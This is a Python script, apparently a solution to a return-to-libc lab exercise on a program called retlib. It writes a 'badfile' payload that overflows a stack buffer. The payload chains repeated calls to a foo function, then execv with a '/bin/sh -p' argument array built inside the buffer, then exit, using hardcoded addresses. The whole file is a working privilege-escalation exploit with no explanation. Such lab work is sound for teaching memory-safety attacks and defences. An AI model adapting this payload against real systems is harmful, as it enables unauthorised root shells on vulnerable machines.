#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

foo_addr=0x565562b0
buffer = 0xffffce20	# Address of input[] inside main()
arr=138
offset=76
content[offset:offset+48] = (foo_addr.to_bytes(4,byteorder='little'))*10

X = offset + 48
sh_addr =  buffer + arr      # buffer of normal execution ./retlib
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = offset + 40
execv_addr = 0xf7e994b0   # The address of execv
content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

Z = offset + 44
exit_addr = 0xf7e04f80     # The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

content[arr:arr+8] 	= bytearray(b'/bin/sh\x00')
content[arr+8:arr+12] 	= bytearray(b'-p\x00\x00')
content[arr+16:arr+20]  = (buffer+arr).to_bytes(4,byteorder='little')
content[arr+20:arr+24]  = (buffer+arr+8).to_bytes(4,byteorder='little')
content[arr+24:arr+28]  = bytearray(b'\x00'*4)

content[X+4:X+8] 	= (buffer+arr+16).to_bytes(4,byteorder='little')


# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)